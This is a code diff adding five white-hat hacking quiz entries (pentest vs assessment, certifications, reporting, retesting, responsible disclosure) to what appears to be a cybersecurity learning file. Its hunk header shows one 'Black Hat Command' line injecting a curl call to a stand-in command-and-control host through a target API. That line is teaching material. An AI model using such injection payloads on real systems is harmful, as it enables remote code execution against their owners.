@@ -222,6 +222,46 @@ Black Hat Command:  curl -X POST http://target/api -d "cmd=curl http://c2.evil/r
     level: "expert",
     codeExample: `// The White Hat Cyber Philosophy:
 "To catch a thief, you must think like a thief; but to defend civilization, you must live with unwavering moral integrity."`
+  },
+  {
+    question: "What is the primary difference between a Penetration Tester and a Vulnerability Assessment Analyst?",
+    shortAnswer: "A Vulnerability Assessment Analyst identifies and catalogs potential security flaws; a Penetration Tester actively exploits those flaws to demonstrate real-world impact and lateral movement.",
+    explanation: "VA is broad and largely automated (e.g. running Nessus/Qualys); penetration testing is deep, manual, and seeks to validate attack vectors and achieve specific objective flags.",
+    hint: "Scanning for flaws vs actively chaining exploits to prove impact.",
+    level: "moderate",
+    codeExample: "nmap --script vuln 10.0.0.5 # VA phase vs msfconsole exploit # PenTest phase"
+  },
+  {
+    question: "What certifications are internationally recognized benchmarks for White Hat ethical hackers?",
+    shortAnswer: "OffSec OSCP (Offensive Security Certified Professional), EC-Council CEH, SANS GIAC GPEN/GXPN, and CREST Certified Tester.",
+    explanation: "OSCP tests hands-on practical exploitation skills in a 24-hour live lab environment, while GPEN and CEH cover broad enterprise methodology, tools, and regulatory ethics.",
+    hint: "Practical certifications like OSCP, GPEN, and CEH.",
+    level: "basic",
+    codeExample: "CertificationRoadmap = ['Security+', 'CEH', 'OSCP', 'OSCE'];"
+  },
+  {
+    question: "Why do White Hat hackers document their findings in comprehensive Executive Summaries and Technical Reports?",
+    shortAnswer: "Because the ultimate value of ethical hacking is enabling corporate leadership to allocate remediation budget and technical engineers to patch specific configuration or code flaws.",
+    explanation: "The report bridges the gap between C-suite risk management (business impact, CVSS scores) and systems engineering (step-by-step reproduction and patch guidance).",
+    hint: "Translating technical exploit paths into executive business risk and patch steps.",
+    level: "moderate",
+    codeExample: "ReportStructure = { ExecutiveSummary: 'Business Risk', TechnicalFindings: 'PoC & Remediation' };"
+  },
+  {
+    question: "How do White Hat consultants verify that vulnerabilities have been remediated successfully?",
+    shortAnswer: "Through a structured 'Retest' (Verification Assessment) where the exact exploit scripts and test cases from the initial assessment are rerun against patched systems.",
+    explanation: "Retesting verifies that patches are applied correctly, that remediation did not introduce regressions, and that compensating firewall/WAF rules effectively block the exploit.",
+    hint: "Executing the original PoC against the patched build to ensure closure.",
+    level: "moderate",
+    codeExample: "python3 exploit_poc.py target.com # Expected result: 403 Forbidden or Patched"
+  },
+  {
+    question: "What is 'Responsible Disclosure' as practiced by White Hat security researchers?",
+    shortAnswer: "Privately notifying the vendor of a discovered vulnerability, granting a reasonable grace period (typically 90 days) for patching before releasing any public advisory.",
+    explanation: "This policy prevents malicious actors from exploiting zero-day flaws while holding vendors accountable for releasing timely security patches to protect end users.",
+    hint: "Coordinated vulnerability disclosure giving vendors 90 days to issue a fix.",
+    level: "advanced",
+    codeExample: "GPG_Encrypt(advisory.txt, vendor_security_public_key)"
   }
 ];
 
